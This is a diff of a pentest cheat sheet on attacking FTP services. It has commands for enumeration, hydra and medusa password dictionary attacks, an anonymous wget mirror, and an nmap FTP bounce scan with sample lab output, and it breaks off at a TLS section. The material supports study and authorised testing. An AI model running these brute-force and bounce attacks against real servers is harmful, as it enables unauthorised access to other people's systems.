@@ -1,46 +1,52 @@
-Connect to FTP
+*Tools to Interact with this service: ftp, lftp, ncftp, filezilla, crossftp* 
+
 ```shell
 ftp $target
 ftp usuario@$target
 ```
 
-Download file to local
 ```shell
-get <name_file>
-```
-
-Specific scripts
-```shell
-nmap -p21 --script="ftp-*" $target
-```
-
-Recursive Listing
-```shell
+ftp> ls -al
 ftp> ls -R
+ftp> get <name_file>
 ```
 
-Read banner
-```shell
+```bash
+# test all ftp script 
+nmap -p21 --script="ftp-*" $target
+# get banner
 nc -nv $target 21
-```
-
-Download All Available Files
-```shell
+# metasploit scan
+search auxiliary/scanner/ftp/
+# dictionary attack
+hydra -l usuario -P $rockyou $target ftp
+medusa -u usuario -P $rockyou -h $target -M ftp 
+# download All Available Files
 wget -m --no-passive ftp://anonymous:anonymous@$target
 ```
-
-Metaexploit:
+## FTP Bounce Attack
+An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.
+The `Nmap` -b flag can be used to perform an FTP bounce attack:
 ```
-search auxiliary/scanner/ftp/
-```
+MarcosV999@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
 
-Hydra:
-Si durante tu enumeración encontraste nombres de usuarios válidos pero no tienes sus contraseñas, puedes auditar la robustez de las credenciales en el servicio FTP:
-```bash
-hydra -l usuario -P /usr/share/wordlists/rockyou.txt $TARGET ftp
-```
-(Puedes cambiar -l usuario por -L usuarios.txt si tienes una lista de posibles nombres).
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
+Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
+Attempting connection to ftp://anonymous:password@10.10.110.213:21
+Connected:220 (vsFTPd 3.0.3)
+Login credentials accepted by FTP server!
+Initiating Bounce Scan at 04:55
+FTP command misalignment detected ... correcting.
+Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
+Nmap scan report for 172.17.0.2
+Host is up.
 
+PORT   STATE  SERVICE
+80/tcp open http
+
+<SNIP>
+```
+Modern FTP servers include protections that, by default, prevent this type of attack, but if these features are misconfigured in modern-day FTP servers, the server can become vulnerable to an FTP Bounce attack.
 ## Service Interaction
 It looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL. For this, we can use the client `openssl` and communicate with the FTP server. The good thing about using `openssl` is that we can see the SSL certificate, which can also be helpful.
 ```shell
